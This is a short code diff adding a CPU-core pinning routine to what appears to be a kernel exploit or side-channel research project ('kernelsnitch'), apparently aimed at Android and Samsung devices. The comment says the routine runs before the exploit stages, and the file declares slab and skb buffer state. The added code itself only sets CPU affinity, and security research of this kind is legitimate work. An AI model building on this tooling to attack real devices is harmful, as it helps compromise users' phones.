@@ -1,6 +1,41 @@
 #include "common.h"
 #include "kernelsnitch/kernelsnitch.h"
 
+#if defined(RMG_PIN_TEST_PRIME)
+int rmg_pinned_core = RMG_CORE_LITERAL;
+
+/*
+ * One-shot choreography-core resolver for the pinning-test branch.
+ * Preference order: X3 prime (cpu7) -> perf cluster high-to-low
+ * (cpu6..cpu3) -> RMG_CORE_LITERAL fallback. Every candidate passes a
+ * live trial-pin (Samsung restricted-core kernels answer EINVAL for the
+ * reserved prime); the winning mask is restored immediately so startup
+ * state is untouched. Called once from both entry points (preload
+ * constructor and main()) BEFORE any exploit stage begins.
+ */
+int rmg_resolve_pinned_core(void) {
+  cpu_set_t prev;
+  if (sched_getaffinity(0, sizeof(prev), &prev) == 0) {
+    static const int order[] = {7, 6, 5, 4, 3};
+    for (size_t i = 0; i < sizeof(order) / sizeof(order[0]); i++) {
+      int c = order[i];
+      if (!CPU_ISSET(c, &prev)) {
+        continue;
+      }
+      cpu_set_t want;
+      CPU_ZERO(&want);
+      CPU_SET(c, &want);
+      if (sched_setaffinity(0, sizeof(want), &want) == 0) {
+        sched_setaffinity(0, sizeof(prev), &prev);
+        rmg_pinned_core = c;
+        return c;
+      }
+    }
+  }
+  return rmg_pinned_core;
+}
+#endif
+
 static struct kernelsnitch_shared_state *ks;
 static size_t mm_objs_per_slab;
 static unsigned char *skb_buf;
